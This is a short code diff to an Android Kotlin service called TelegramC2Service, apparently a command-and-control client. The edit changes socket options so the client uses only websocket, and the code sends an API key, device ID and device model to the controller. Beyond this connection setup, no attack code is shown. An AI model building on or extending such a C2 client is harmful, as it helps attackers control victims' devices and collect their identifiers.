@@ -207,9 +207,8 @@ class TelegramC2Service : Service() {
                 reconnection = false
                 timeout = 20000
                 forceNew = true
-                transports = arrayOf("polling", "websocket")
-                upgrade = true
-                auth = mapOf(
+                transports = arrayOf("websocket")
+                                auth = mapOf(
                     "api_key" to apiKey,
                     "device_id" to deviceId,
                     "model" to Build.MODEL,
